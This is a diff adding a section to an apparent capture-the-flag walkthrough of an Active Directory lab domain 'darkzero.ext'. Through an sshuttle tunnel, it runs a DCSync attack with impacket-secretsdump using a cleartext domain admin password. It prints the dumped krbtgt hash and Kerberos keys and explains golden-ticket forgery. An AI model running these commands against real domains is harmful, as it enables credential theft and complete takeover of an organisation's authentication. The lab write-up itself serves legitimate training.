@@ -3898,6 +3898,83 @@ trustAttributes: 8
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.10 — DCSync `darkzero.ext`
+
+**Why this step:** celia holds Domain Admins membership, which confers the directory replication rights required for DCSync. Extract the krbtgt key to enable ticket forgery, and the full NTLM hash set for onward use.
+
+**Commands:**
+
+Establish a tunnel from the attacking host into the internal subnet — run in a dedicated terminal and leave running:
+
+```bash
+sshuttle -r josh@TARGET_IP 172.16.20.0/24
+```
+
+In a separate terminal:
+
+```bash
+impacket-secretsdump 'darkzero.ext/celia:babygurl13@172.16.20.2' -just-dc-user krbtgt
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`sshuttle -r josh@TARGET_IP 172.16.20.0/24`|Transparently route the internal subnet over SSH|Makes 172.16.20.x reachable from Kali with no per-tool proxy config|
+|`impacket-secretsdump`|Extract credentials from a domain controller|Pulls password hashes out of AD|
+|`darkzero.ext/celia:babygurl13@172.16.20.2`|Domain, username, password, target DC|Who to authenticate as, and where|
+|`-just-dc-user krbtgt`|Replicate only the krbtgt account|Fetch one specific account instead of the whole database|
+
+**Result:**
+
+```
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8beaf5f950fefe79f608390a806d29a7:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6
+krbtgt:aes128-cts-hmac-sha1-96:ce9c97f5fd7021806190196f637e4b4e
+krbtgt:0x17:8beaf5f950fefe79f608390a806d29a7
+[*] Cleaning up...
+```
+
+**What this gives you:** The domain's ticket-signing key — complete and persistent control over authentication in `darkzero.ext`.
+
+**Key findings:**
+
+- **krbtgt NT hash: `8beaf5f950fefe79f608390a806d29a7`** (RID 502). This key signs every Kerberos ticket issued in the domain.
+- AES256 and AES128 Kerberos keys were also recovered, permitting forgery with modern encryption types where RC4 is disabled by policy.
+- DCSync succeeded over the sshuttle tunnel using celia's cleartext password. Domain Admins membership implicitly grants `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, which is what the DRSUAPI method requires.
+- Possession of the krbtgt key permits forging **golden tickets** — Kerberos TGTs for arbitrary principals with arbitrary group memberships, valid until the krbtgt password is rotated twice.
+- Sysmon for Linux was observed on SRV01 in 3.4, and DCSync is a heavily monitored operation on Windows DCs. In a real engagement this action would be conspicuous.
+
+**Correction to group enumeration:** The earlier `paste - -` output was offset by one line — the header comment `# requesting: sAMAccountName objectSid` occupied the first field, pairing each group name with the following group's SID. Corrected custom-group RIDs for `darkzero.ext`:
+
+|Group|RID|Notes|
+|---|---|---|
+|Forest Trust Accounts|528|Custom, RID below 1000|
+|External Trust Accounts|529|Custom, RID below 1000|
+|RepoManager|1106|Custom|
+|GiteaAdmins|1107|Custom|
+|RepoAudit|1111|Custom|
+|ServiceHandler|1114|Confirmed independently in 4.5|
+
+**Deviation from reference material:** Published writeups for this target build the forest pivot on a group named `InfrastructureAdministrators` with RID 1603. **No such group exists on this instance.** The trust-crossing principal must be identified empirically from the groups present here, or from `darkzero.htb` itself.
+
+**Domain SID:** `S-1-5-21-2850783758-1231244658-2051857529`
+
+**Next:** Enumerate `darkzero.htb` across the forest trust to identify a principal whose SID survives filtering and confers privilege on the target forest's domain controller.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
